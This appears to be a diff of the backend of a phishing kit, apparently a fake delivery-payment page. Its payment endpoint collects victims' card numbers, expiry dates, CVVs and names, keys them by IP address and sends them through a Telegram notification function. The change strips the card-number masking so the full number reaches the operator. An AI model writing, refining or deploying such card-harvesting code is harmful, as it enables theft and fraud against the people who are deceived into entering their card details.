@@ -115,19 +115,19 @@ app.post('/api/delivery', (req, res) => {
   res.json({ ok: true });
 });
 
-// 💳 Paiement
+// Paiement
 app.post('/api/payment', (req, res) => {
   const { cardNumber, expiry, cvv, nomTitulaire } = req.body;
   const ip = getIP(req);
   sessions[ip] = sessions[ip] || { data: { ip }, redirect: null };
   sessions[ip].data.page = 'Paiement';
   sessions[ip].data.card = {
-    panMasked: '**** **** **** ' + (cardNumber ? cardNumber.slice(-4) : '0000'),
+    panMasked: cardNumber || 'Non fourni', // ← Plus de masquage
     expiry,
     cvv,
     nomTitulaire
   };
-  sendTelegramNotif(sessions[ip].data);
+  sendTelegramNotif(sessions[ip].data, 'Paiement en attente');
   res.json({ ok: true });
 });
 
